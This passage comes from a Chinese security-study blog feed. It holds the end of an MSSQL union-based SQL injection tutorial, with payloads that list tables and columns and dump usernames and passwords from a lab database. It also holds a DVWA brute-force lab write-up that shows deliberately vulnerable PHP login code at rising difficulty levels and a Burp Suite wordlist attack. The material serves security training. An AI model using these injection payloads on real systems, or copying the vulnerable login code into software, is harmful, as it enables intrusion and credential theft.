获取当前用户名</span><br><span class="line">@@SERVERNAME 获取服务器主机信息</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union all select <span class="literal">null</span>,<span class="title function_ invoke__">db_name</span>(),<span class="literal">null</span>,<span class="literal">null</span></span><br><span class="line">- 获取表名：</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span>  union all select <span class="literal">null</span>,(select top <span class="number">1</span> name <span class="keyword">from</span> mozhe_db_v2.dbo.sysobjects where xtype=<span class="string">&#x27;u&#x27;</span>),<span class="literal">null</span>,<span class="literal">null</span></span><br><span class="line">union all select <span class="literal">null</span>,(select top <span class="number">1</span> name <span class="keyword">from</span> mozhe_db_v2.dbo.sysobjects where xtype=<span class="string">&#x27;u&#x27;</span> <span class="keyword">and</span> name not <span class="title function_ invoke__">in</span> (<span class="string">&#x27;manage&#x27;</span>)),<span class="literal">null</span>,<span class="literal">null</span></span><br><span class="line">- 获取列名：</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span>  union all select <span class="literal">null</span>,(select top <span class="number">1</span> <span class="title function_ invoke__">col_name</span>(<span class="title function_ invoke__">object_id</span>(<span class="string">&#x27;manage&#x27;</span>),<span class="number">1</span>) <span class="keyword">from</span> sysobjects),<span class="literal">null</span>,<span class="literal">null</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span>  union all select <span class="literal">null</span>,(select top <span class="number">1</span> <span class="title function_ invoke__">col_name</span>(<span class="title function_ invoke__">object_id</span>(<span class="string">&#x27;manage&#x27;</span>),<span class="number">2</span>) <span class="keyword">from</span> sysobjects),<span class="literal">null</span>,<span class="literal">null</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span>  union all select <span class="literal">null</span>,(select top <span class="number">1</span> <span class="title function_ invoke__">col_name</span>(<span class="title function_ invoke__">object_id</span>(<span class="string">&#x27;manage&#x27;</span>),<span class="number">3</span>) <span class="keyword">from</span> sysobjects),<span class="literal">null</span>,<span class="literal">null</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span>  union all select <span class="literal">null</span>,(select top <span class="number">1</span> <span class="title function_ invoke__">col_name</span>(<span class="title function_ invoke__">object_id</span>(<span class="string">&#x27;manage&#x27;</span>),<span class="number">4</span>) <span class="keyword">from</span> sysobjects),<span class="literal">null</span>,<span class="literal">null</span></span><br><span class="line">查到没有回显为止</span><br><span class="line">- 获取数据：</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union all select <span class="literal">null</span>,username, password ,<span class="literal">null</span> <span class="keyword">from</span> manage</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SEC-WEB攻防-04 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-web-015-靶场DVWA-Brute Force</title>
      <link href="/2023/05/18/CTF-web-015/"/>
      <url>/2023/05/18/CTF-web-015/</url>
      
        <content type="html"><![CDATA[<p>注意，这里需要使用字典，<a href="top100.txt">点我</a>下载字典top100</p><p>这里的防护等级是逐级加高的，最明显的出现防护等级提升的是对于SQL语句防护的提升。</p><h1 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h1><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// 获取get传参</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// md5加密</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 数据库查询语句</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="comment">// 查询，查到就返回正确结果，查不到报错结果</span></span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>( <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 基本识别，正确就返回Welcome，错误就返回Username</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysql_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="title function_ invoke__">mysql_result</span>( <span class="variable">$result</span>, <span class="number">0</span>, <span class="string">&quot;avatar&quot;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h2><p>破解的思路：</p><p>1.暴力破解，直接调用字典进行破解</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 因为没有任何认证，直接破解无需顾忌什么。</span></span><br><span class="line"><span class="comment">// 尝试进行登录，截取到下面的URL：</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/vulnerabilities/brute/?username=name&amp;password=123456&amp;Login=Login</span></span><br><span class="line"><span class="comment">// 其中，出现关键变量，也即是账户信息：</span></span><br><span class="line">username=name&amp;password=<span class="number">123456</span></span><br><span class="line">能更迭的是俩个变量：username和password</span><br><span class="line"><span class="comment">// 尝试使用BP进行暴力破解</span></span><br></pre></td></tr></table></figure><p><img src="a1.jpg" alt="Burp操作"><br><img src="a2.jpg" alt="Burp操作"><br><img src="a3.jpg" alt="Burp操作"><br><img src="a4.jpg" alt="Burp操作"></p><h1 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h1><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="comment">// 将传入的特殊字符进行转义处理，例如加斜杠</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>( <span class="variable">$user</span> );</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加密</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>( <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysql_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="title function_ invoke__">mysql_result</span>( <span class="variable">$result</span>, <span class="number">0</span>, <span class="string">&quot;avatar&quot;</span> );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">sleep</span>( <span class="number">2</span> );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">思路：</span><br><span class="line">    和上面相比，多了一个转义语句，这道题目相当与加了一个屏障</span><br><span class="line">    防止特殊语句的注入，单仍然无法防止暴力破解</span><br><span class="line">    解题思路和LOW相同，使用字典破解即可</span><br><span class="line">    具体步骤不赘述</span><br></pre></td></tr></table></figure><h1 id="height"><a href="#height" class="headerlink" title="height"></a>height</h1><h2 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Token唯一身份认证（目前最大麻烦）</span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="comment">// 去除反斜杠、转义字符</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$user</span> );</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="comment">// 转义掉特殊字符，防止sql注入</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>( <span class="variable">$user</span> );</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>( <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysql_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$avatar</span> = <span class="title function_ invoke__">mysql_result</span>( <span class="variable">$result</span>, <span class="number">0</span>, <span class="string">&quot;avatar&quot;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        <span class="title function_ invoke__">sleep</span>( <span class="title function_ invoke__">rand</span>( <span class="number">0</span>, <span class="number">3</span> ) );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">针对Token的解决思路：实时捕获Token并且加入信息提交</span><br><span class="line">Token本身是随机生成的，用于防止直接的暴力破解</span><br><span class="line"></span><br><span class="line">=&gt;使用BP解决Token的动态捕获和返还问题</span><br><span class="line"></span><br><span class="line">新版BP貌似没有带单线程攻击，使用旧版BP即可</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="b1.jpg" alt="难度等级3的BP攻击"><br><img src="b2.jpg" alt="难度等级3的BP攻击"><br><img src="b3.jpg" alt="难度等级3的BP攻击"><br><img src="b4.jpg" alt="难度等级3的BP攻击"><br><img src="b5.jpg" alt="难度等级3的BP攻击"><br><img src="b6.jpg" alt="难度等级3的BP攻击"></p><h1 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h1><h2 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Token唯一身份认证</span></span><br><span class="line">    <span class="comment">//检查反CSRF令牌</span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理用户名和密码输入</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$user</span> );</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>( <span class="variable">$user</span> );</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//默认值</span></span><br><span class="line">    <span class="comment"># 登录失败总数</span></span><br><span class="line">    <span class="variable">$total_failed_login</span> = <span class="number">3</span>;</span><br><span class="line">    <span class="comment"># 锁定时间</span></span><br><span class="line">    <span class="variable">$lockout_time</span>       = <span class="number">15</span>;</span><br><span class="line">    <span class="comment"># 账户锁定</span></span><br><span class="line">    <span class="variable">$account_locked</span>     = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//检查数据库（检查用户信息）    </span></span><br><span class="line">    <span class="comment"># 准备SQL查询语句，:user是占位符</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">    <span class="comment"># 用参数绑定将变量 $user 与 :user 占位符进行关联</span></span><br><span class="line">    <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line">    <span class="comment"># 上两句合起来就是一句完整的sql语句</span></span><br><span class="line">    <span class="comment"># 执行查询语句</span></span><br><span class="line">    <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">    <span class="comment"># 默认从执行方法取出一行数据</span></span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//检查用户是否已被锁定。</span></span><br><span class="line">    <span class="comment"># 判断用户是否被锁定</span></span><br><span class="line">    <span class="comment"># 如果被锁定：阻止其登录</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># # $data-&gt;rowCount() == 1 </span></span><br><span class="line">    <span class="comment">#  ==&gt; 判断用户是否存在</span></span><br><span class="line">    <span class="comment">#  - 判断之前查询的结果中是否返回一行数据 </span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># # $row[ &#x27;failed_login&#x27; ] &gt;= $total_failed_login</span></span><br><span class="line">    <span class="comment">#  =&gt; 获取之前用户尝试登录的失败次数</span></span><br><span class="line">    <span class="comment">#  - 判断 $row 变量中的 failed_login 字段的值是否大于等于 $total_failed_login 变量的值</span></span><br><span class="line">    <span class="comment">#  - 这句就是限制访问次数的，限定3次锁定</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">rowCount</span>() == <span class="number">1</span> ) &amp;&amp; ( <span class="variable">$row</span>[ <span class="string">&#x27;failed_login&#x27;</span> ] &gt;= <span class="variable">$total_failed_login</span> ) )  &#123;</span><br><span class="line">        <span class="comment">// User locked out.  Note, using this method would allow for user enumeration!</span></span><br><span class="line">        <span class="comment">//echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;;</span></span><br><span class="line">        <span class="comment">//用户被锁定。请注意，使用此方法将允许用户枚举！</span></span><br><span class="line">        <span class="comment">//echo&quot;&lt;pre&gt;&lt;br/&gt;由于登录错误太多，此帐户已被锁定。&lt;/pre&gt;&quot;；</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//计算何时允许用户再次登录</span></span><br><span class="line">        <span class="comment"># 计算阻止登陆的时间</span></span><br><span class="line">        <span class="variable">$last_login</span> = <span class="variable">$row</span>[ <span class="string">&#x27;last_login&#x27;</span> ];</span><br><span class="line">        <span class="variable">$last_login</span> = <span class="title function_ invoke__">strtotime</span>( <span class="variable">$last_login</span> );</span><br><span class="line">        <span class="variable">$timeout</span>    = <span class="title function_ invoke__">strtotime</span>( <span class="string">&quot;<span class="subst">&#123;$last_login&#125;</span> +<span class="subst">&#123;$lockout_time&#125;</span> minutes&quot;</span> );</span><br><span class="line">        <span class="variable">$timenow</span>    = <span class="title function_ invoke__">strtotime</span>( <span class="string">&quot;now&quot;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">//检查是否已经过了足够的时间，是否还没有锁定帐户</span></span><br><span class="line">        <span class="comment"># 检测当前用户登录的时间是否大于阻止登录的时间</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$timenow</span> &gt; <span class="variable">$timeout</span> )</span><br><span class="line">            <span class="variable">$account_locked</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 从用户表当中检测登录的用户名和密码是否正确</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::<span class="variable constant_">PARAM_STR</span>);</span><br><span class="line">    <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:password&#x27;</span>, <span class="variable">$pass</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If its a valid login...</span></span><br><span class="line">    <span class="comment">// 如果是有效登录</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">rowCount</span>() == <span class="number">1</span> ) &amp;&amp; ( <span class="variable">$account_locked</span> == <span class="literal">false</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="comment">// 获取用户详细信息</span></span><br><span class="line">        <span class="variable">$avatar</span>       = <span class="variable">$row</span>[ <span class="string">&#x27;avatar&#x27;</span> ];</span><br><span class="line">        <span class="variable">$failed_login</span> = <span class="variable">$row</span>[ <span class="string">&#x27;failed_login&#x27;</span> ];</span><br><span class="line">        <span class="variable">$last_login</span>   = <span class="variable">$row</span>[ <span class="string">&#x27;last_login&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="comment">// 登录成功</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;<span class="subst">&#123;$user&#125;</span>&lt;/em&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Had the account been locked out since last login?</span></span><br><span class="line">        <span class="comment">// 自上次登录以来，帐户是否已被锁定？</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$failed_login</span> &gt;= <span class="variable">$total_failed_login</span> ) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Number of login attempts: &lt;em&gt;<span class="subst">&#123;$failed_login&#125;</span>&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Reset bad login count</span></span><br><span class="line">        <span class="comment">// 重置错误登录计数</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        <span class="comment">// 登录失败</span></span><br><span class="line">        <span class="title function_ invoke__">sleep</span>( <span class="title function_ invoke__">rand</span>( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Give the user some feedback</span></span><br><span class="line">        <span class="comment">// 给用户一些反馈</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in <span class="subst">&#123;$lockout_time&#125;</span> minutes&lt;/em&gt;.&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update bad login count</span></span><br><span class="line">        <span class="comment">// 更新错误登录计数</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set the last login time</span></span><br><span class="line">    <span class="comment">// 设置上次登录时间</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line"><span class="comment">// 生成反CSRF令牌</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h2><p>难度有点大，暂时不做。</p>]]></content>
      
      
      <categories>
          
          <category> CTF赛题 </category>
          
          <category> DVWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-2022版-0015-WEB攻防-06-通用漏洞之SQL注入</title>
      <link href="/2023/05/15/SEC-Study-0043/"/>
      <url>/2023/05/15/SEC-Study-0043/</url>
      
